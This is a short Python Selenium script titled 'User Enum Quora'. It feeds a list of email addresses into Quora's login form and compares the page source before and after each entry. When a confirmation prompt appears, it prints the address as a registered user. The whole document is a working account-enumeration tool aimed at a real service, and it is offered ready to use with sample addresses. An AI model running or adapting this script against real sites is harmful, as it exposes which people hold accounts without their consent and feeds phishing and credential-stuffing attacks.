#  User Enum Quora

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
import extract_html_diff

# Using edge browser
driver = webdriver.Edge(executable_path='msedgedriver')

# Using Firefox browser
#driver = webdriver.FirefoxProfile()
#driver = webdriver.Firefox(driver)


print("The usernames present in quora are:")

# Place all the Email IDs to test in the for loop as shown below.
# You can remove all the Email IDs below
for i in ["ccohen@aol.com", "batman@gmail.com", "koyex66140@tlhao86.com", "superman@gmail.com"]:

    user = i

    driver.get("https://www.quora.com/")
    p1 = driver.page_source
    elem=driver.find_element_by_xpath("//input[@type='email']") #type = 'text'/'email'
    elem.send_keys(user)
    elem.send_keys(Keys.TAB)
    sleep(2)
    p2 = driver.page_source
    p3 = extract_html_diff.as_string(p2,p1)

    if "Please confirm your email address." in p3:
        print(i)
    sleep(2)
driver.close()